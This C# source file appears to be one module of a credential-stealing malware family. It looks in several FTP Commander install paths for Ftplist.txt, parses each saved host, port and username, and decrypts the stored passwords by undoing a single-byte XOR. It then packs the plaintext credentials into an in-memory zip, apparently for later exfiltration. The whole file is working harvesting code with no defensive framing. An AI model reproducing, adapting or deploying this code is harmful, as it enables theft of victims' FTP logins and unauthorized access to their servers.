using Helper.Data;
using Helper.Encrypted;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Targets.Applications
{
	public class FTPCommander : ITarget
	{
	  public void Collect(InMemoryZip zip, Counter counter)
	  {
	    string[] strArray1 = new string[5]
	    {
	      "C:\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt",
	      "C:\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
	      "C:\\cftp\\Ftplist.txt",
	      $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
	      $"C:\\Users\\{Environment.UserName}\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt"
	    };
	    Counter.CounterApplications counterApplications = new Counter.CounterApplications()
	    {
	      Name = nameof (FTPCommander)
	    };
	    List<string> values = new List<string>();
	    foreach (string path in strArray1)
	    {
	      if (File.Exists(path))
	      {
	        foreach (string readAllLine in File.ReadAllLines(path))
	        {
	          if (!string.IsNullOrWhiteSpace(readAllLine))
	          {
	            string[] strArray2 = readAllLine.Split(';');
	            if (strArray2.Length >= 6)
	            {
	              string str1 = strArray2[1].Split('=')[1];
	              string str2 = strArray2[2].Split('=')[1];
	              string input = strArray2[3].Split('=')[1];
	              string str3 = strArray2[4].Split('=')[1];
	              if (!(strArray2[5].Split('=')[1] != "0"))
	              {
	                string str4 = Xor.DecryptString(input, (byte) 25);
	                values.Add($"Url: {str1}:{(string.IsNullOrEmpty(str2) ? "21" : str2)}\nUsername: {str3}\nPassword: {str4}\n");
	                string str5 = "FTP Commander\\Hosts.txt";
	                counterApplications.Files.Add($"{path} => {str5}");
	              }
	            }
	          }
	        }
	      }
	    }
	    if (values.Count <= 0)
	      return;
	    string entryPath = "FTP Commander\\Hosts.txt";
	    zip.AddFile(entryPath, Encoding.UTF8.GetBytes(string.Join("\n", (IEnumerable<string>) values)));
	    counterApplications.Files.Add(entryPath ?? "");
	    counter.Applications.Add(counterApplications);
	  }
	}
}
